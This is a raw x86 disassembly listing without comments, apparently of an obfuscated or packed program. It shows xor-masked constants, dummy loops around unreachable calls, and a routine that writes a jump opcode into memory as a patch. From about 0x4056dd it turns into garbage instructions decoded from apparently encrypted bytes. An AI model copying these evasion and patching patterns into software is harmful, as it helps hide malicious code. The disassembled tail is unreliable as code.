  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0x892ee325
  4056ec:	pop    esp
  4056ed:	rcr    DWORD PTR [edi+0x7c],cl
  4056f0:	jl     0x40573c
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	add    DWORD PTR [edi],ebx
  4056f7:	adc    eax,DWORD PTR [eax]
  4056f9:	push   esi
  4056fa:	je     0x405771
  4056fc:	aad    0x81
  4056fe:	repz imul ebp,DWORD PTR cs:[ebx-0x237e71e2],0xffffffc4
  405707:	inc    ebx
  405708:	(bad)  
  405709:	jb     0x405782
  40570b:	jo     0x4056ba
  40570d:	lds    ecx,FWORD PTR [ecx+0x72645528]
  405713:	mov    ecx,0x7878b387
  405718:	mov    eax,0xcc82fd3f
  40571d:	aaa    
  40571e:	pop    esp
  40571f:	scas   al,BYTE PTR es:[edi]
  405720:	mov    DWORD PTR [edx+0x3d],edx
  405723:	nop
  405724:	pop    edx
  405725:	cmp    BYTE PTR [edi+ecx*4+0x68],dl
  405729:	inc    ebx
  40572a:	xor    eax,0xd1d6b0d6
  40572f:	add    edi,ebx
  405731:	and    eax,0x11a2c415
  405736:	fstp   DWORD PTR [esi]
  405738:	xor    eax,0x6e64fc89
  40573d:	outs   dx,DWORD PTR ds:[esi]
  40573e:	sbb    al,0x23
  405740:	xchg   esp,eax
  405741:	push   eax
  405742:	push   ds
  405743:	cmp    eax,0x405247b2
  405748:	gs jge 0x40572b
  40574b:	or     ebx,edi
  40574d:	adc    DWORD PTR [eax+0x2e154571],esi
  405753:	adc    esi,DWORD PTR [ebx+0x1d]
  405756:	push   eax
  405757:	das    
  405758:	pop    ss
  405759:	push   ebp
  40575a:	mov    eax,0x750349e5
  40575f:	repnz repnz test DWORD PTR [esi],0xcfb7e54c
  405767:	adc    edi,edx
  405769:	inc    edi
  40576a:	and    edx,DWORD PTR [ebp+0x36]
  40576d:	out    0xe6,al
  40576f:	xor    BYTE PTR [ebp-0x53d0f63f],bl
  405775:	mov    ebp,0x922800bd
  40577a:	(bad)  
  40577b:	gs jmp 0x134e07f2
  405781:	sbb    eax,0x321328b0
  405786:	repz and bh,BYTE PTR [edi+eax*8-0x67]
  40578b:	jae    0x405791
  40578d:	sub    eax,0xf7bf150
  405792:	xor    BYTE PTR [ebx],al
  405794:	mov    bl,0x33
  405796:	outs   dx,BYTE PTR ds:[esi]
  405797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405798:	into   
  405799:	retf   0x345f
  40579c:	shr    BYTE PTR [ecx-0x33],0x57
  4057a0:	inc    edi
  4057a1:	imul   edx,DWORD PTR [esi],0x67245f55
  4057a7:	dec    ebp
  4057a8:	cs adc al,0xd7
  4057ab:	adc    bh,bl
  4057ad:	or     edi,DWORD PTR [edx]
  4057af:	retf   0xc2a3
  4057b2:	iret   
  4057b3:	add    esp,DWORD PTR [ecx-0x78]
  4057b6:	(bad)  
  4057b8:	mov    bh,0x6f
  4057ba:	xor    eax,0xad1b63d2
  4057bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c0:	cli    
  4057c1:	call   0x9e9d:0x3706f1df
  4057c8:	push   ds
  4057c9:	cli    
  4057ca:	sub    bl,bl
  4057cc:	enter  0x584f,0x7c
  4057d0:	imul   ecx,DWORD PTR [ebx-0x33],0x4d
  4057d4:	or     esp,ebp
  4057d6:	sti    
  4057d7:	nop
  4057d8:	lahf   
  4057d9:	ret    0x4f35
  4057dc:	mov    al,0x7f
  4057de:	ficom  WORD PTR [edx+0x65843c0f]
  4057e4:	(bad)  
  4057e5:	arpl   WORD PTR [edx+0x59ef5df0],sp
  4057eb:	loope  0x4057fc
  4057ed:	jo     0x405802
  4057ef:	jge    0x4057f9
  4057f1:	loope  0x40580d
  4057f3:	fiadd  DWORD PTR [ebx]
  4057f5:	test   BYTE PTR [esp+eax*8-0x75],cl
  4057f9:	stos   DWORD PTR es:[edi],eax
  4057fa:	or     ah,ah
  4057fc:	aas    
  4057fd:	fsubr  DWORD PTR [edi]
  4057ff:	repz shl DWORD PTR [edx+0x1868cbe1],0x3a
  405807:	lods   eax,DWORD PTR ds:[esi]
  405808:	(bad)  
  405809:	mov    edi,0x5981b207
  40580e:	mov    cl,0xe0
  405810:	sbb    al,0xa
  405812:	leave  
  405813:	sbb    esp,DWORD PTR [ebx-0x46]
  405816:	push   es
  405817:	hlt    
  405818:	pop    ebp
  405819:	fwait
  40581a:	ins    DWORD PTR es:[edi],dx
  40581b:	fnsave [esi+0x3f]
  40581e:	xor    esp,0x39a90dd1
  405824:	sbb    edx,ebx
  405826:	dec    esp
  405827:	mov    ah,0x2
  405829:	sbb    BYTE PTR [ebp+0x74dfef16],bl
  40582f:	(bad)  
  405831:	adc    dl,BYTE PTR [edi+0x5c]
  405834:	iret   
  405835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405836:	leave  
  405837:	and    esi,DWORD PTR [ebx-0x3b]
  40583a:	inc    esp
  40583b:	or     bl,cl
  40583d:	movsx  edi,BYTE PTR [ecx+ebx*8]
  405841:	lock icebp 
  405843:	push   0xae0ec6ad
  405848:	stos   DWORD PTR es:[edi],eax
  405849:	loop   0x4057d0
  40584b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40584c:	fild   DWORD PTR [ebx]
  40584e:	call   0xc2b9a506
  405853:	std    
  405854:	clc    
  405855:	or     ebp,DWORD PTR [ebx+0x4ab2cf3e]
  40585b:	xor    ebp,esi
  40585d:	jb     0x405848
  40585f:	lods   eax,DWORD PTR ds:[esi]
  405860:	and    dl,BYTE PTR [edi-0x6f2b8e6]
  405866:	mov    eax,0x1a4adf31
  40586b:	sub    eax,0x5cbf4398
  405870:	cmp    bl,BYTE PTR [edx+0x57a0f530]
  405876:	gs dec edx
  405878:	fistp  DWORD PTR [ecx+0x645e6c45]
  40587e:	sub    al,0xe2
  405880:	mov    ebx,0xc16f1e54
  405885:	aaa    
  405886:	adc    DWORD PTR [eax-0x1f],ebx
  405889:	dec    esp
  40588a:	or     BYTE PTR [ecx-0x70b2bb16],0x55
  405891:	mov    al,ds:0xa3cc8e0
  405896:	cmp    eax,0xeae3070c
  40589b:	jmp    0x98bc:0x8d469ac7
  4058a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058a3:	sti    
  4058a4:	and    BYTE PTR [esi+ebp*8-0x6c],bl
  4058a8:	xchg   esp,eax
  4058a9:	ror    al,0xf6
  4058ac:	jecxz  0x4058ac
  4058ae:	pop    edi
  4058af:	ins    BYTE PTR es:[edi],dx
  4058b0:	rcr    DWORD PTR [eax+0x5b],0x4c
  4058b4:	je     0x4058f6
  4058b6:	mov    esi,0xf1ca582e
  4058bb:	sbb    BYTE PTR [ebx+ebx*8],bl
  4058be:	mov    al,0xe
  4058c0:	retf   
  4058c1:	fistp  DWORD PTR [edx+0x7276912f]
  4058c7:	inc    edi
  4058c8:	iret   
  4058c9:	les    ecx,FWORD PTR [edi+0x33]
  4058cc:	and    ebp,DWORD PTR [ecx+edi*1]
  4058cf:	repz sub dh,bl
  4058d2:	stos   BYTE PTR es:[edi],al
  4058d3:	stc    
  4058d4:	jge    0x4058d6
  4058d6:	add    edi,DWORD PTR [esi+0x7a]
  4058d9:	pushf  
  4058da:	pushf  
  4058db:	jl     0x405914
  4058dd:	sahf   
  4058de:	push   ecx
  4058df:	xchg   edx,eax
  4058e0:	out    dx,eax
  4058e1:	cmp    al,0xcf
  4058e3:	(bad)  
  4058e4:	mov    al,0x62
  4058e6:	leave  
  4058e7:	lock iret 
  4058e9:	fwait
  4058ea:	test   eax,0xe36385b3
  4058ef:	lea    esp,[ebx+0x33d718c2]
  4058f5:	sbb    esp,DWORD PTR [ebp-0x40277c0d]
  4058fb:	fsubr  DWORD PTR [eax+0x4f88e40a]
  405901:	div    BYTE PTR [esi-0x26]
  405904:	or     al,al
  405906:	mov    esp,0xd3746026
  40590b:	das    
  40590c:	push   0xe14682c3
  405911:	loopne 0x40590a
  405913:	fbstp  TBYTE PTR [edi+ebp*2-0x30944cd8]
  40591a:	adc    BYTE PTR [ebx],bl
  40591c:	hlt    
  40591d:	dec    esi
  40591e:	ds daa 
  405920:	in     eax,0x18
  405922:	in     al,dx
  405923:	push   ebx
  405924:	jle    0x40592b
  405926:	sub    DWORD PTR [edx-0x27242d3c],edi
  40592c:	mov    al,0xfb
  40592e:	adc    eax,0xdccbd1e5
  405933:	out    dx,al
  405934:	xor    dl,dh
  405936:	adc    BYTE PTR [eax-0x16],dh
  405939:	mov    ecx,0xa62f4c0b
  40593e:	std    
  40593f:	(bad)  
  405940:	cmp    ah,BYTE PTR [esi+0x777b22c8]
  405946:	push   eax
  405947:	push   0x4f
  405949:	xor    dl,BYTE PTR [ecx]
  40594b:	cmp    BYTE PTR [edi-0x33],0x23
  40594f:	sub    edi,DWORD PTR [esi-0x21]
  405952:	out    dx,al
  405953:	push   ebp
  405954:	mov    ebp,0xa2af5bcd
  405959:	rcl    DWORD PTR [ebp+0x75b5cdaf],0x70
  405960:	mov    bl,0xe1
  405962:	fcomp  QWORD PTR [eax+edi*8+0x2fc28a97]
  405969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596a:	adc    dl,dl
  40596c:	into   
  40596d:	cmp    ah,BYTE PTR [esi+0x50d09b05]
  405973:	pop    edx
  405974:	and    ebx,DWORD PTR [eax-0x31]
  405977:	xchg   esp,eax
  405978:	sbb    DWORD PTR [esi],eax
  40597a:	jne    0x4059fa
  40597c:	inc    edi
  40597d:	mov    al,0xa
  40597f:	mov    ds:0x45ae074e,eax
  405984:	(bad)  
  405985:	retf   0x9562
  405988:	test   DWORD PTR [esi],eax
  40598a:	add    eax,DWORD PTR [edx-0xf]
  40598d:	aad    0x31
  40598f:	lods   al,BYTE PTR ds:[esi]
  405990:	iret   
  405991:	imul   esp,DWORD PTR [ecx-0xc09212b],0x4c5b5b2c
  40599b:	or     eax,0xcb27640b
  4059a0:	mov    ds:0x8c72e730,al
  4059a5:	pop    edx
  4059a6:	push   edx
  4059a7:	(bad)  
  4059a8:	fwait
  4059a9:	mov    DWORD PTR [ecx-0x26],ecx
  4059ac:	das    
  4059ad:	dec    ecx
  4059ae:	mov    dl,BYTE PTR [ebp-0x7a]
  4059b1:	outs   dx,DWORD PTR ds:[esi]
  4059b2:	push   ebx
  4059b3:	imul   esp,DWORD PTR [ebp+0x3f7008b],0xffffffe2
  4059ba:	cmc    
  4059bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059bc:	sub    cl,BYTE PTR [eax+0x680f7fb6]
  4059c2:	aas    
  4059c3:	inc    ebx
  4059c4:	outs   dx,DWORD PTR ds:[esi]
  4059c5:	and    dh,dh
  4059c7:	popf   
  4059c8:	dec    eax
  4059c9:	dec    esi
  4059ca:	jae    0x405a32
  4059cc:	xchg   ebx,eax
  4059cd:	(bad)  
  4059ce:	sbb    edi,esi
  4059d0:	jge    0x405a3c
  4059d2:	not    esp
  4059d4:	ins    BYTE PTR es:[edi],dx
  4059d5:	imul   esi,ebx,0xfadfa33d
  4059db:	or     eax,0xdc76ea60
  4059e0:	sbb    BYTE PTR [ebx+eax*2-0xeafeb77],cl
  4059e7:	and    BYTE PTR [edi],cl
  4059e9:	mov    edi,0x26cd8d03
  4059ee:	add    ebp,DWORD PTR [eax]
  4059f0:	xchg   ebp,eax
  4059f1:	jle    0x405989
  4059f3:	mov    cs,WORD PTR [edx+edx*1]
  4059f6:	aaa    
  4059f7:	fsub   QWORD PTR [edx]
  4059f9:	and    ebp,DWORD PTR ds:0x4ec9bd5a
  4059ff:	cwde   
  405a00:	add    ch,bh
  405a02:	sbb    ch,BYTE PTR [edi+0x580672b0]
  405a08:	jno    0x405a1a
  405a0a:	jecxz  0x405a4b
  405a0c:	sar    BYTE PTR [edx],cl
  405a0e:	xor    al,0x61
  405a10:	rcr    DWORD PTR [edx],cl
  405a12:	loop   0x4059d8
  405a14:	aaa    
  405a15:	pop    ebp
  405a16:	je     0x405a0c
  405a18:	xor    eax,DWORD PTR [eax+0x4f324651]
  405a1e:	mov    eax,ds:0xee952574
  405a23:	inc    edi
  405a24:	ins    BYTE PTR es:[edi],dx
  405a25:	mov    ecx,0x281ea774
  405a2a:	out    dx,eax
  405a2b:	push   ecx
  405a2c:	jle    0x405a75
